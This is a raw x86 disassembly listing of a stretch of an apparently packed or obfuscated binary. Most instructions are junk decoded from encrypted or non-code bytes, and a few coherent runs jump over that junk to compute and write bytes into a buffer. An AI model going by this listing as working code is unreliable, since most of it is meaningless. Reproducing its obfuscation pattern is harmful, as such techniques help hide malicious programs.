  4049b7:	mov    ds:0xaf1437bf,eax
  4049bc:	sbb    ebx,DWORD PTR [ecx]
  4049be:	mov    eax,ds:0x3d03326
  4049c3:	push   ebp
  4049c4:	in     al,dx
  4049c5:	jmp    0x404b6f
  4049ca:	test   BYTE PTR [ebp-0x13],cl
  4049cd:	xor    edi,ebp
  4049cf:	push   ebx
  4049d0:	mov    esp,0xd1280b5d
  4049d5:	xor    ebp,esp
  4049d7:	loopne 0x4049f4
  4049d9:	ins    DWORD PTR es:[edi],dx
  4049da:	xchg   ecx,eax
  4049db:	sub    al,0x7e
  4049dd:	jle    0x40496a
  4049df:	jg     0x404a5f
  4049e1:	jle    0x404a46
  4049e3:	loopne 0x4049a2
  4049e5:	push   ss
  4049e6:	rol    DWORD PTR [esi+0x71],cl
  4049e9:	push   ecx
  4049ea:	pop    esp
  4049eb:	ds push 0x7f
  4049ee:	mov    ch,0xcc
  4049f0:	inc    eax
  4049f1:	rcl    DWORD PTR ds:0x26307fae,cl
  4049f7:	leave  
  4049f8:	iretw  
  4049fa:	cmc    
  4049fb:	dec    esp
  4049fc:	jne    0x4049e1
  4049fe:	loopne 0x4049a6
  404a00:	outs   dx,BYTE PTR ds:[esi]
  404a01:	cmp    al,0x36
  404a03:	push   edi
  404a04:	iret   
  404a05:	fcomip st,st(4)
  404a07:	mov    esi,edx
  404a09:	call   0x6d9666dd
  404a0e:	clc    
  404a0f:	xor    eax,0x2b21fbf4
  404a14:	fwait
  404a15:	lock jmp 0xb526a081
  404a1b:	cmp    DWORD PTR [ecx-0x61],0x4d
  404a1f:	hlt    
  404a20:	popa   
  404a21:	pop    eax
  404a22:	or     BYTE PTR [ebx+0xf3efc00],0x25
  404a29:	popa   
  404a2a:	lahf   
  404a2b:	out    dx,al
  404a2c:	fwait
  404a2d:	jne    0x4049f8
  404a2f:	lock repnz xchg ebx,eax
  404a32:	jbe    0x404a98
  404a34:	sub    esp,DWORD PTR [ebx+0x3a]
  404a37:	test   al,0x1f
  404a39:	adc    al,0x97
  404a3b:	inc    esi
  404a3c:	loopne 0x404a43
  404a3e:	push   ebp
  404a3f:	dec    ecx
  404a40:	mov    ch,0x2
  404a42:	test   BYTE PTR [edx-0x65],bl
  404a45:	or     bl,BYTE PTR [edi]
  404a47:	lds    edi,FWORD PTR [esi-0x65]
  404a4a:	jg     0x404a9f
  404a4c:	pop    esp
  404a4d:	imul   ebx,ebp,0x1b8e5154
  404a53:	jp     0x4049ee
  404a55:	fisttp DWORD PTR [ebx]
  404a57:	xchg   esp,eax
  404a58:	mov    al,ds:0xe381a5b4
  404a5d:	daa    
  404a5e:	dec    ecx
  404a5f:	mov    edi,?
  404a61:	sub    BYTE PTR [edx+0x32],0xbc
  404a65:	(bad)  
  404a66:	push   ecx
  404a67:	push   ebp
  404a68:	bound  eax,QWORD PTR [edx-0x2b]
  404a6b:	clc    
  404a6c:	push   esp
  404a6d:	sti    
  404a6e:	je     0x404a8e
  404a70:	pop    edx
  404a71:	fs dec edi
  404a73:	aaa    
  404a74:	push   0x9ac693d6
  404a79:	call   0xc35328a3
  404a7e:	icebp  
  404a7f:	sub    dh,BYTE PTR [edx]
  404a81:	or     ch,cl
  404a83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a84:	add    al,0x95
  404a86:	int3   
  404a87:	das    
  404a88:	stc    
  404a89:	sar    BYTE PTR [edx-0x80],1
  404a8c:	and    edx,DWORD PTR [edx]
  404a8e:	or     BYTE PTR [esp+esi*1],bh
  404a91:	into   
  404a92:	or     cl,ch
  404a94:	sar    BYTE PTR [eax+0x3a],0x1a
  404a98:	in     eax,dx
  404a99:	lods   eax,DWORD PTR ds:[esi]
  404a9a:	cmp    dl,BYTE PTR [ecx+0x72]
  404a9d:	add    DWORD PTR [ebp-0x43e3d984],esi
  404aa3:	lahf   
  404aa4:	xchg   edx,eax
  404aa5:	mov    WORD PTR [ebx+0x4aa17d47],es
  404aab:	(bad)  
  404aac:	(bad)  
  404aad:	ins    BYTE PTR es:[edi],dx
  404aae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404aaf:	in     eax,0x34
  404ab1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ab2:	jae    0x404aa9
  404ab4:	les    ebp,FWORD PTR [eax]
  404ab6:	jnp    0x404a77
  404ab8:	pop    esi
  404ab9:	push   es
  404aba:	in     eax,0x55
  404abc:	sbb    BYTE PTR [eax],cl
  404abe:	in     al,0x9b
  404ac0:	cld    
  404ac1:	and    cl,bh
  404ac3:	or     DWORD PTR [esi+0x6c],ecx
  404ac6:	pop    eax
  404ac7:	(bad)  
  404ac8:	mov    esi,0x11c7c4c7
  404acd:	push   edx
  404ace:	adc    ebp,DWORD PTR [esi+ebp*1+0x6d101663]
  404ad5:	sbb    al,bh
  404ad7:	dec    ebp
  404ad8:	out    dx,eax
  404ad9:	stos   BYTE PTR es:[edi],al
  404ada:	leave  
  404adb:	imul   ebx,DWORD PTR cs:[ecx-0x5275c943],0xfd5afc59
  404ae6:	lods   al,BYTE PTR ds:[esi]
  404ae7:	ins    BYTE PTR es:[edi],dx
  404ae8:	and    ecx,DWORD PTR cs:[edx-0x42]
  404aec:	sub    eax,0x857704bd
  404af1:	es scas eax,DWORD PTR es:[edi]
  404af3:	inc    esp
  404af4:	xchg   edi,eax
  404af5:	das    
  404af6:	aaa    
  404af7:	add    ecx,ebx
  404af9:	inc    edx
  404afa:	lods   al,BYTE PTR ds:[esi]
  404afb:	pop    ecx
  404afc:	out    dx,al
  404afd:	sbb    al,0x39
  404aff:	int3   
  404b00:	mov    ds:0x1ee3f1ce,eax
  404b05:	test   eax,0x7ea7cb7b
  404b0a:	repz mov ds:0xfedb658d,al
  404b10:	pop    ss
  404b11:	add    DWORD PTR [edx+0x52],ecx
  404b14:	sbb    eax,0x3f78fe7c
  404b19:	add    cl,BYTE PTR [esi+0xccfa3a7]
  404b1f:	push   es
  404b20:	push   edx
  404b21:	mov    esi,0x52d39d7e
  404b26:	pop    ebp
  404b27:	ret    
  404b28:	xor    al,0xd5
  404b2a:	outs   dx,DWORD PTR ds:[esi]
  404b2b:	mov    eax,edi
  404b2d:	stc    
  404b2e:	jns    0x404b0e
  404b30:	fsubr  DWORD PTR [edi-0x2272fddf]
  404b36:	imul   edx,DWORD PTR [edi-0x66],0x493b0b3a
  404b3d:	popf   
  404b3e:	(bad)  
  404b3f:	icebp  
  404b40:	sar    cl,0x89
  404b43:	loopne 0x404af8
  404b45:	jmp    0x4914fc65
  404b4a:	push   edx
  404b4b:	xor    al,0xfe
  404b4d:	jle    0x404b62
  404b4f:	or     BYTE PTR [ebp-0x2b],cl
  404b52:	imul   esi,DWORD PTR [edi+0xf],0x24
  404b56:	imul   esi,DWORD PTR [ecx],0x2b
  404b59:	test   BYTE PTR [esi+0x3],0xff
  404b5d:	add    esi,DWORD PTR [edx+ebx*2+0x76]
  404b61:	cmp    eax,DWORD PTR [eax]
  404b63:	movhps QWORD PTR [ebx-0x103d686c],xmm7
  404b6a:	dec    eax
  404b6b:	add    BYTE PTR [edi-0x44],ch
  404b6e:	push   es
  404b6f:	mov    edi,DWORD PTR [ebp-0x1c]
  404b72:	mov    dl,BYTE PTR [edx+edi*1+0x32729d]
  404b79:	mov    BYTE PTR [ebp+0xb],dl
  404b7c:	mov    dl,BYTE PTR [ebp+0xf]
  404b7f:	mov    edi,DWORD PTR [ebp-0xc]
  404b82:	xor    edi,eax
  404b84:	add    edi,DWORD PTR [ebp-0x14]
  404b87:	jmp    0x404d31
  404b8c:	in     al,dx
  404b8d:	push   esi
  404b8e:	adc    dh,BYTE PTR [eax+0x6a6c4c94]
  404b94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b95:	(bad)  
  404b96:	aas    
  404b97:	push   eax
  404b98:	in     al,0xc5
  404b9a:	add    BYTE PTR ds:0x7e7e2e2e,ah
  404ba0:	mov    edi,DWORD PTR [edi+0x7e]
  404ba3:	jle    0x404ba1
  404ba5:	test   eax,0x20bfc072
  404baa:	call   0x5948:0xcf32c880
  404bb1:	inc    esp
  404bb2:	jle    0x404b4d
  404bb4:	inc    edi
  404bb5:	jmp    0x48dcbd66
  404bba:	xor    BYTE PTR ds:0xda899877,0x74
  404bc1:	js     0x404bbd
  404bc3:	outs   dx,BYTE PTR ds:[esi]
  404bc4:	repnz das 
  404bc6:	cmp    al,0x83
  404bc8:	push   ebx
  404bc9:	fistp  DWORD PTR [eax+0x2d]
  404bcc:	inc    ebx
  404bcd:	pusha  
  404bce:	out    0xd8,eax
  404bd0:	adc    eax,0x58b41b05
  404bd5:	sbb    BYTE PTR [ecx],ch
  404bd7:	(bad)  
  404bd8:	into   
  404bd9:	push   ebx
  404bda:	shr    BYTE PTR [esi-0x20890d73],cl
  404be0:	rol    DWORD PTR [ebx+0x53061aeb],1
  404be6:	xor    eax,0x4f968620
  404beb:	ret    
  404bec:	fsub   DWORD PTR [edi-0x257c1ba0]
  404bf2:	jge    0x404c5f
  404bf4:	dec    eax
  404bf5:	cli    
  404bf6:	in     eax,dx
  404bf7:	cmp    ebx,DWORD PTR [eax+0x61a8e81a]
  404bfd:	sub    BYTE PTR [eax+0x22],0x8a
  404c01:	mov    bl,0x51
  404c03:	into   
  404c04:	inc    eax
  404c05:	shr    DWORD PTR ds:0x37ea8b57,cl
  404c0b:	cmp    BYTE PTR [ecx+esi*8-0x5b],bh
  404c0f:	int3   
  404c10:	mov    edi,0x247645f3
  404c15:	or     eax,0xab78f79f
  404c1a:	dec    ecx
  404c1b:	sbb    eax,0xa50df3f9
  404c20:	fiadd  DWORD PTR [edx]
  404c22:	xor    edi,DWORD PTR [eax-0xc]
  404c25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c26:	(bad)  
  404c28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c29:	jns    0x404c2a
  404c2b:	or     dh,BYTE PTR [eax+edx*8-0x11]
  404c2f:	add    esp,DWORD PTR [ecx+0x57b9de3d]
  404c35:	popf   
  404c36:	fiadd  DWORD PTR [edi+0x6e]
  404c39:	inc    edi
  404c3a:	test   DWORD PTR [edx-0x2b],eax
  404c3d:	lds    ebp,FWORD PTR [ebp+0x3a]
  404c40:	(bad)  
  404c41:	imul   edi,DWORD PTR [ebx],0x25768df6
  404c47:	shl    DWORD PTR [eax-0x5b],0xc4
  404c4b:	ins    DWORD PTR es:[edi],dx
  404c4c:	mov    esp,0xa4aa672b
  404c51:	sub    DWORD PTR [esi+ebx*8],ebx
  404c54:	cmp    BYTE PTR [ecx+edx*2-0x2a3f2d8f],dh
  404c5b:	xchg   BYTE PTR [ecx],dl
  404c5d:	inc    edx
  404c5e:	jb     0x404c8a
  404c60:	push   eax
  404c61:	mov    esi,0x35953582
  404c66:	or     eax,0x6552ac5b
  404c6b:	(bad)  
  404c6c:	mov    ch,0xb3
  404c6e:	aas    
  404c6f:	and    eax,0x69f3191b
  404c74:	mov    al,BYTE PTR [ebx-0x6e]
  404c77:	cmp    al,0x59
  404c79:	push   esp
  404c7a:	push   es
  404c7b:	push   ss
  404c7c:	std    
  404c7d:	push   edi
  404c7e:	pusha  
  404c7f:	xchg   edx,eax
  404c80:	xchg   BYTE PTR [edi+0x29b01656],ah
  404c86:	mov    bh,0x2
  404c88:	mov    edi,0xef971859
  404c8d:	dec    ebp
  404c8e:	cmp    eax,0xd2b1a89f
  404c93:	stos   DWORD PTR es:[edi],eax
  404c94:	(bad)  
  404c95:	sti    
  404c96:	or     bh,BYTE PTR [eax-0x49]
  404c99:	mov    ds,WORD PTR [edx+0x5b]
  404c9c:	adc    al,0x32
  404c9e:	sub    al,0x79
  404ca0:	inc    ecx
  404ca1:	sbb    al,0xc3
  404ca3:	pop    eax
  404ca4:	push   0xfb5a0233
  404ca9:	in     al,0xa9
  404cab:	fwait
  404cac:	pop    ds
  404cad:	neg    BYTE PTR [edx+ebp*2+0x27]
  404cb1:	mov    DWORD PTR [ebx],ecx
  404cb3:	cmc    
  404cb4:	pop    esp
  404cb5:	lock jmp 0x9723eff6
  404cbb:	daa    
  404cbc:	ins    BYTE PTR es:[edi],dx
  404cbd:	fidiv  WORD PTR [esi-0x5d]
  404cc0:	sub    dl,bl
  404cc2:	or     eax,0x8ec64d21
  404cc7:	shl    bl,0x2b
  404cca:	out    dx,al
  404ccb:	leave  
  404ccc:	jno    0x404cb9
  404cce:	in     al,dx
  404ccf:	into   
  404cd0:	dec    esp
  404cd1:	jno    0x404d50
  404cd3:	jge    0x404cda
  404cd5:	scas   eax,DWORD PTR es:[edi]
  404cd6:	and    bh,bl
  404cd8:	sti    
  404cd9:	rol    esp,cl
  404cdb:	rcl    DWORD PTR [ebx+0x19],0xea
  404cdf:	jmp    0x404c90
  404ce1:	pop    ds
  404ce2:	mov    ebx,0x7a5653c9
  404ce7:	xchg   esi,eax
  404ce8:	jbe    0x404cf6
  404cea:	cmp    bh,BYTE PTR [edx+0x38]
  404ced:	pop    ebx
  404cee:	mov    ?,ebp
  404cf0:	or     ecx,ebp
  404cf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cf3:	fistp  QWORD PTR [esi+0x5b97ee5d]
  404cf9:	fcomp  DWORD PTR [eax+0x3e69ba2f]
  404cff:	jl     0x404cbd
  404d01:	push   ebx
  404d02:	ret    
  404d03:	and    BYTE PTR [esi],al
  404d05:	sub    eax,0xdd26f183
  404d0a:	mov    bl,0x20
  404d0c:	xor    DWORD PTR [esi],eax
  404d0e:	add    al,0x50
  404d10:	repz in eax,dx
  404d12:	xor    BYTE PTR [esi+esi*8+0x579f6399],bh
  404d19:	call   0x26413a05
  404d1e:	call   0xe9af:0x17b9e271
  404d25:	cs in  al,0x5f
  404d28:	jb     0x404d38
  404d2a:	xchg   DWORD PTR [ecx],eax
  404d2c:	add    al,0x9e
  404d2e:	and    dl,BYTE PTR [ebx+0x1]
  404d31:	mov    ebx,DWORD PTR [ebp-0x1c]
  404d34:	mov    BYTE PTR [edi+ebx*1+0x32729d],dl
  404d3b:	mov    dl,BYTE PTR [ebp+0xb]
  404d3e:	mov    edi,DWORD PTR [ebp-0x18]
  404d41:	xor    edi,eax
  404d43:	add    edi,DWORD PTR [ebp-0x14]
  404d46:	mov    ebx,DWORD PTR [ebp-0x1c]
  404d49:	mov    BYTE PTR [edi+ebx*1+0x32729d],dl
  404d50:	mov    edx,DWORD PTR [ebp-0x44]
  404d53:	mov    edi,DWORD PTR [ebp-0xc]
  404d56:	xor    edx,eax
  404d58:	xor    edi,eax
  404d5a:	add    edx,ecx
  404d5c:	add    edi,ecx
  404d5e:	imul   edx,edi
  404d61:	add    edx,DWORD PTR [ebp-0x14]
  404d64:	mov    DWORD PTR [ebp-0x14],edx
  404d67:	mov    edx,DWORD PTR [ebp-0xc]
  404d6a:	mov    edi,DWORD PTR [ebp-0x24]
  404d6d:	xor    edx,eax
  404d6f:	add    edx,ecx
  404d71:	imul   edx,edi
  404d74:	mov    edi,DWORD PTR [ebp-0xc]
  404d77:	xor    edi,eax
  404d79:	sub    edx,edi
  404d7b:	mov    edi,DWORD PTR [ebp-0xc]
  404d7e:	mov    ebx,DWORD PTR [ebp-0x14]
  404d81:	jmp    0x404f2b
  404d86:	test   DWORD PTR [ebp+0x21bc10ba],0xf561ad9d
  404d90:	xchg   ebp,eax
  404d91:	and    BYTE PTR [edi],al
  404d93:	dec    edx
  404d94:	jl     0x404d66
  404d96:	mov    ebx,0x8b7e7e2f
  404d9b:	jg     0x404e1b
  404d9d:	jle    0x404d68
  404d9f:	mov    dh,0x60
  404da1:	pop    ecx
  404da2:	pop    ebx
  404da3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404da4:	mov    ecx,0x1d9f96b3
  404da9:	sbb    eax,0xd3bb5fcf
  404dae:	scas   al,BYTE PTR es:[edi]
  404daf:	add    DWORD PTR [eax],edx
  404db1:	icebp  
  404db2:	pop    ebp
  404db3:	push   0x31
  404db5:	mov    dl,0xfe
  404db7:	push   esi
  404db8:	fcom   QWORD PTR [edx-0x65]
  404dbb:	rdtsc  
  404dbd:	jmp    0x57d7:0xe5edd6a2
  404dc4:	stos   BYTE PTR es:[edi],al
  404dc5:	test   BYTE PTR [eax-0x7e],ah
  404dc8:	fist   DWORD PTR [esi-0x47c7cb2a]
  404dce:	js     0x404e04
  404dd0:	mov    WORD PTR [esi],ds
  404dd2:	mov    edx,0x2ee48986
  404dd7:	jg     0x404dd2
  404dd9:	and    eax,ecx
  404ddb:	nop
  404ddc:	in     al,dx
  404ddd:	or     BYTE PTR [edi+0x72],al
  404de0:	push   edx
  404de1:	mov    dl,BYTE PTR [edx+0x4a]
  404de4:	xchg   esi,eax
  404de5:	(bad)  
  404de6:	(bad)  
  404de7:	dec    ebp
  404de8:	arpl   WORD PTR [edi-0x592ca86c],ax
  404dee:	pop    edi
  404def:	cmp    BYTE PTR [ebx-0x47e953ea],0xa7
  404df6:	mov    ebx,0x832bfed
  404dfb:	out    0x55,eax
  404dfd:	idiv   BYTE PTR [ebp+edi*1-0xa7c4e15]
  404e04:	jb     0x404e18
  404e06:	jle    0x404d96
  404e08:	add    esp,DWORD PTR [ebx+0x20f89dbb]
  404e0e:	mov    al,ds:0x41ac53d6
  404e13:	retf   0x260b
  404e16:	push   eax
  404e17:	jnp    0x404e3b
  404e19:	sbb    DWORD PTR [ebp-0x6f],0xffffffb0
  404e1d:	(bad)  
  404e1e:	arpl   WORD PTR [ebx],bp
  404e20:	jmp    0x9f861758
  404e25:	mov    edx,0x218527fd
  404e2a:	mov    BYTE PTR [ebx],ch
  404e2c:	(bad)  
  404e2d:	cmp    bh,BYTE PTR [esi+0x3346e7f7]
  404e33:	pop    ecx
  404e34:	jp     0x404de1
  404e36:	cmp    dl,ch
  404e38:	and    BYTE PTR [edx+0x444cf2de],0x46
  404e3f:	jmp    0xe6b665ac
  404e44:	mov    edi,0x984effd2
  404e49:	jne    0x404ea9
  404e4b:	lods   al,BYTE PTR ds:[esi]
  404e4c:	inc    edx
  404e4d:	pop    esp
  404e4e:	bound  ebp,QWORD PTR [ebx-0x2b097869]
  404e54:	shr    DWORD PTR [esi-0x41a637a7],1
  404e5a:	inc    ebx
  404e5b:	bound  ecx,QWORD PTR [eax-0x71]
  404e5e:	cdq    
  404e5f:	sub    ecx,eax
  404e61:	mov    ch,0x30
  404e63:	inc    ecx
  404e64:	pop    edi
  404e65:	mov    al,ds:0x588f030e
  404e6a:	jb     0x404ec1
  404e6c:	mov    esp,0x7859e97d
  404e71:	std    
  404e72:	leave  
  404e73:	int    0xcc
  404e75:	pop    esi
  404e76:	add    BYTE PTR [edi-0x2f22ded6],cl
  404e7c:	fnstenv [edx-0x2d]
  404e7f:	cmp    al,0x1d
  404e81:	andnps xmm0,XMMWORD PTR [edx+0x28]
  404e85:	les    esp,FWORD PTR [ebx+ecx*4-0x10b6fdb1]
  404e8c:	mov    edi,0xa4903bd
  404e91:	stos   DWORD PTR es:[edi],eax
  404e92:	sbb    ebp,edx
  404e94:	mov    al,0x9b
  404e96:	jge    0x404f12
  404e98:	xor    esi,DWORD PTR [ebx+0x76]
  404e9b:	pop    esi
  404e9c:	adc    DWORD PTR [edx],eax
  404e9e:	jge    0x404e4f
  404ea0:	jmp    0x244c:0xaf74a0ec
  404ea7:	add    DWORD PTR [edi+0x14199879],esp
  404ead:	and    DWORD PTR [esi-0x55],edx
  404eb0:	xchg   ecx,eax
  404eb1:	xchg   DWORD PTR [ecx-0x5d300cd8],eax
  404eb7:	dec    esi
  404eb8:	xchg   ebx,eax
  404eb9:	js     0x404f1b
  404ebb:	add    cl,BYTE PTR [eax-0x5d6de1f8]
  404ec1:	push   ss
  404ec2:	repz xor al,0x17
  404ec5:	repz mov edx,0xf02e6aa6
  404ecb:	mov    esp,0x4b111544
  404ed0:	add    edx,DWORD PTR [edi+0xa286f6a]
  404ed6:	xchg   ebp,ebx
  404ed8:	push   0xffffffed
  404eda:	xchg   ebx,eax
  404edb:	out    0x61,eax
  404edd:	jns    0x404f21
  404edf:	fs inc esp
  404ee1:	ds adc al,0xa9
  404ee4:	jle    0x404ec4
  404ee6:	hlt    
  404ee7:	adc    eax,0xd08a3f8c
  404eec:	call   0x94ffcc7e
  404ef1:	loop   0x404f1f
  404ef3:	pop    es
  404ef4:	into   
  404ef5:	xor    dh,0x13
  404ef8:	jecxz  0x404ed2
  404efa:	aam    0x19
  404efc:	shl    BYTE PTR [edx+ebx*1],cl
  404eff:	jmp    0x57d2:0x7be378bb
  404f06:	lock repnz xchg ecx,eax
  404f09:	xor    al,0xce
  404f0b:	push   ebx
  404f0c:	push   cs
  404f0d:	jae    0x404f5a
  404f0f:	mov    ah,0x5c
  404f11:	(bad)  
  404f12:	out    dx,eax
  404f13:	leave  
  404f14:	pop    eax
  404f15:	sub    eax,0xcbeafa63
  404f1a:	not    ebx
  404f1c:	std    
  404f1d:	and    eax,0x54f94353
  404f22:	xor    ebp,DWORD PTR [edi-0x80]
  404f25:	hlt    
  404f26:	xchg   esp,eax
  404f27:	cld    
  404f28:	ss dec esi
  404f2a:	mov    dl,0x33
  404f2c:	clc    
  404f2d:	add    edi,ecx
  404f2f:	imul   edi,ebx
  404f32:	jmp    0x4050dc
  404f37:	mov    esp,0xfaa10ab4
  404f3c:	jns    0x404efb
  404f3e:	dec    ebp
  404f3f:	mov    edx,0x3fd15a29
  404f44:	loopne 0x404f9d
  404f46:	and    al,cl
  404f48:	and    DWORD PTR [esi+0x7e],edi
  404f4b:	mov    edi,DWORD PTR [edi+0x7e]
  404f4e:	jle    0x404f80
  404f50:	rcl    DWORD PTR [edi],0x94
  404f53:	ins    BYTE PTR es:[edi],dx
  404f54:	(bad)
  404f58:	inc    ebx
  404f59:	clc    
  404f5a:	(bad)  
  404f5b:	fsubrp st(0),st
  404f5d:	ins    BYTE PTR es:[edi],dx
  404f5e:	jae    0x404fa0
  404f60:	pop    eax
  404f61:	xchg   esp,eax
  404f62:	daa    
  404f63:	loopne 0x404fa6
  404f65:	inc    esi
  404f66:	jne    0x404fc7
  404f68:	scas   al,BYTE PTR es:[edi]
  404f69:	cmp    BYTE PTR [ecx],0x2f
  404f6c:	(bad)  
  404f6d:	cdq    
  404f6e:	push   ss
  404f6f:	dec    esi
  404f70:	pushf  
  404f71:	leave  
  404f72:	sar    BYTE PTR [ebp-0x7b93ac60],cl
  404f78:	gs jbe 0x404fc4
  404f7b:	ins    BYTE PTR es:[edi],dx
  404f7c:	xor    esp,DWORD PTR [edi+edx*4+0x79]
  404f80:	inc    ebx
  404f81:	pop    eax
  404f82:	pop    ebp
  404f83:	push   ebx
  404f84:	adc    esi,ebp
  404f86:	lahf   
  404f87:	xor    bh,bh
  404f89:	pop    edi
  404f8a:	xchg   edx,eax
  404f8b:	mov    ecx,0xd5bb7cdf
  404f90:	pop    ebp
  404f91:	nop
  404f92:	stc    
  404f93:	dec    esi
  404f94:	daa    
  404f95:	xchg   BYTE PTR [edi-0x3cd4f870],bh
  404f9b:	mov    DWORD PTR [edi],ebp
  404f9d:	mov    ch,0xce
  404f9f:	push   0xcc932b02
  404fa4:	push   ss
  404fa5:	xchg   ecx,eax
  404fa6:	lods   al,BYTE PTR ds:[esi]
  404fa7:	lods   al,BYTE PTR ds:[esi]
  404fa8:	repz int3 
  404faa:	sbb    DWORD PTR [ebx+eiz*4-0x15868a0],esp
  404fb1:	add    DWORD PTR [esi-0x5a],0xc1aefc33
  404fb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fb9:	bound  eax,QWORD PTR [edx]
  404fbb:	or     eax,0x35afb24d
  404fc0:	sub    ch,BYTE PTR [edx+0x4a494a88]
  404fc6:	mov    al,ds:0x3002f128
  404fcb:	pop    ebp
  404fcc:	aad    0xb5
  404fce:	mov    ecx,0x1ef013b5
  404fd3:	and    eax,ebx
  404fd5:	call   0xa569:0xa390a112
  404fdc:	cwde   
  404fdd:	sub    DWORD PTR es:[esi+0x16],esp
  404fe1:	sub    eax,0x83f95e37
  404fe6:	adc    cl,0xcd
  404fe9:	test   esp,edx
  404feb:	shr    DWORD PTR [eax-0x62a8df47],0x23
  404ff2:	dec    esi
  404ff3:	fs pop edi
  404ff5:	and    ebx,0x2d
  404ff8:	mov    bh,0x9f
  404ffa:	ins    BYTE PTR es:[edi],dx
  404ffb:	lock mov edx,0xa8f6b848
  405001:	dec    eax
  405002:	inc    edi
  405003:	shl    DWORD PTR [ebx],0x42
  405006:	aaa    
  405007:	icebp  
  405008:	test   BYTE PTR [ebx-0x42],ch
  40500b:	jmp    0x404f9d
  40500d:	pop    ebx
  40500e:	test   DWORD PTR [eax],esi
  405010:	(bad)  
  405011:	or     esp,DWORD PTR [eax+0x1d2e04db]
  405017:	cmp    al,0xc5
  405019:	sti    
  40501a:	jnp    0x404f9c
  40501c:	js     0x404ff0
  40501e:	jmp    DWORD PTR [ebx]
  405020:	aad    0x2
  405022:	add    cl,BYTE PTR [edx+esi*4-0x10]
  405026:	push   esi
  405027:	inc    edi
  405028:	add    al,0x96
  40502a:	fisubr DWORD PTR [ebx-0x7d]
  40502d:	cs (bad) 
  40502f:	(bad)  
  405030:	or     eax,0xbfc2f0cf
  405035:	add    DWORD PTR [eax],eax
  405037:	js     0x40505e
  405039:	inc    ecx
  40503a:	mov    eax,ds:0xbf132b7a
  40503f:	nop
  405040:	inc    edi
  405041:	xchg   edx,eax
  405042:	enter  0x8626,0x67
  405046:	div    BYTE PTR [esi]
  405048:	xor    esp,DWORD PTR [esi+0x72]
  40504b:	sbb    al,0x3a
  40504d:	mov    al,0x51
  40504f:	xchg   edx,edi
  405051:	cmp    BYTE PTR [ebx-0xa1dff26],al
  405057:	adc    DWORD PTR [ebx],ecx
  405059:	xor    eax,0x42a42a0c
  40505e:	jge    0x40508d
  405060:	xchg   edi,eax
  405061:	repz pop ds
  405063:	mov    al,ds:0x38d472e1
  405068:	cs repz mov ah,0xb9
  40506c:	jge    0x4050a0
  40506e:	test   al,0x4b
  405070:	sahf   
  405071:	in     eax,dx
  405072:	sub    DWORD PTR [eax-0x68],edx
  405075:	mov    eax,ds:0x47b38c6
  40507a:	(bad)  
  40507b:	lahf   
  40507c:	xchg   esp,eax
  40507d:	mov    ebp,0xe27bff29
  405082:	xchg   esp,eax
  405083:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405084:	movlps QWORD PTR [ecx+eax*2+0x462ddb05],xmm0
  40508c:	inc    ebx
  40508d:	xchg   ebx,eax
  40508e:	or     BYTE PTR [ebx+eax*4-0x820f2a],ah
  405095:	test   al,0xc7
  405097:	xor    DWORD PTR [ebp-0x3ea200f3],edi
  40509d:	inc    esi
  40509e:	in     eax,0x2e
  4050a0:	ja     0x40510e
  4050a2:	and    ebp,esi
  4050a4:	push   es
  4050a5:	push   es
  4050a6:	mov    al,ds:0x43eac770
  4050ab:	gs cmc 
  4050ad:	mov    cl,0xbd
  4050af:	add    bl,al
  4050b1:	ja     0x40511f
  4050b3:	jne    0x405100
  4050b5:	xchg   ebx,eax
  4050b6:	xchg   esi,eax
  4050b7:	add    eax,0xc616630c
  4050bc:	sub    eax,0x7ad8538
  4050c1:	bsf    eax,DWORD PTR [edx-0x1adea67e]
  4050c8:	mov    eax,0xae4c2e4e
  4050cd:	mov    eax,0xd673d021
  4050d2:	sahf   
  4050d3:	nop
  4050d4:	xor    BYTE PTR [ecx-0x29130f90],dh
  4050da:	(bad)  
  4050db:	ror    DWORD PTR [ebx-0x27cc17a3],0x2b
  4050e2:	ror    DWORD PTR [ebp+0x729d1fbc],1
  4050e8:	xor    al,BYTE PTR [eax]
  4050ea:	cmp    edi,edx
  4050ec:	jbe    0x404654
  4050f2:	mov    edx,DWORD PTR [ebp-0xc]
  4050f5:	mov    edi,DWORD PTR [ebp-0x24]
  4050f8:	xor    edx,eax
  4050fa:	add    edx,ecx
  4050fc:	jmp    0x4052a6
  405101:	pop    edi
  405102:	mov    DWORD PTR [ebp+ebx*8-0x42980294],edx
  405109:	sbb    al,0x25
  40510b:	or     ebx,ecx
  40510d:	xor    eax,0x45ecf170
  405112:	and    bh,BYTE PTR [esi+0x7e]
  405115:	mov    edi,DWORD PTR [edi+0x7e]
  405118:	jle    0x405128
  40511a:	xchg   edx,edi
  40511c:	jne    0x405198
  40511e:	mov    bh,0x84
  405120:	mov    bl,BYTE PTR [edi+0x2fcb072d]
  405126:	aad    0xf6
  405128:	mov    esp,0xd0748520
  40512d:	sbb    bh,ah
  40512f:	cwde   
  405130:	push   ebp
  405131:	frstor [edi+0x772865ac]
  405137:	sbb    al,0x36
  405139:	ror    DWORD PTR [esi-0x309fc4ce],cl
  40513f:	lods   eax,DWORD PTR ds:[esi]
  405140:	data16 (bad) 
  405142:	fnstsw WORD PTR [eax-0x1dfd7c67]
  405148:	stos   DWORD PTR es:[edi],eax
  405149:	mov    al,0xf
  40514b:	mov    esp,0x80b23225
  405150:	xchg   DWORD PTR [ebp+0x72a0b91b],ebx
  405156:	mov    edx,DWORD PTR [esi]
  405158:	nop
  405159:	sbb    al,0xf5
  40515b:	xchg   esp,eax
  40515c:	mov    esi,0x930cd053
  405161:	rol    BYTE PTR [ebp+0x4fdade49],1
  405167:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405168:	pop    esi
  405169:	mov    al,ds:0x464c2de2
  40516e:	pop    DWORD PTR [edi]
  405170:	int    0x40
  405172:	ja     0x40511e
  405174:	test   eax,0x693b5160
  405179:	dec    eax
  40517a:	inc    eax
  40517b:	mov    ds:0xae5e7bab,al
  405180:	cli    
  405181:	cwde   
  405182:	jge    0x405159
  405184:	pop    ds
  405185:	pop    es
